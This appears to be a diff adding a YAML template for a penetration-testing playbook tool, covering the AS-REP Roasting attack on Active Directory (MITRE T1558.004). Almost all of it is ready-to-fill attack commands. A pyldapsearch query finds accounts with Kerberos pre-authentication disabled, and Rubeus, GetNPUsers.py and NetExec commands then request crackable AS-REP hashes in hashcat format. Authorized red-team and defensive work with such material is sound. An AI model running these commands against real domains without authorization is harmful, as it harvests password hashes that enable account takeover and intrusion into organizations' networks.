@@ -1,0 +1,30 @@
+name: "AS-REP Roasting"
+mitre_technique_id: "T1558.004"
+sections:
+- title: "Enumeration"
+  tabs:
+  - title: "pyldapsearch"
+    content: |
+      ```
+      pyldapsearch '{{DOMAIN_NAME}}/{{LOWPRIVILEGED_DOMAIN_USER}}:{{LOWPRIVILEGED_DOMAIN_USER_PASSWORD}}' "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" -dc-ip {{DC_IP}} -ldaps -output users_asrep.txt
+      ```
+- title: "Roasting"
+  tabs:
+  - title: "Rubeus"
+    content: |
+      Rubeus does not support roasting based on a list. You can roast single users:
+      ```
+      rubeus.exe asreproast /user:{{TARGET_DOMAIN_USER}}
+      ```
+  - title: "GetNPUsers.py"
+    content: |
+      userfile option requires one username per line (just the username, no domain needed).
+      ```
+      GetNPUsers.py -usersfile {{TARGET_FILE_NAME}} -request -format hashcat -outputfile ASREProastables.txt -dc-ip {{DC_IP}} '{{DOMAIN_NAME}}/{{LOWPRIVILEGED_DOMAIN_USER}}:{{LOWPRIVILEGED_DOMAIN_USER_PASSWORD}}'
+      ```
+  - title: "NetExec"
+    content: |
+      This will enumerate the accounts again!
+      ```
+      nxc ldap  -u {{LOWPRIVILEGED_DOMAIN_USER}} -p {{LOWPRIVILEGED_DOMAIN_USER_PASSWORD}} --asreproast output.txt
+      ```
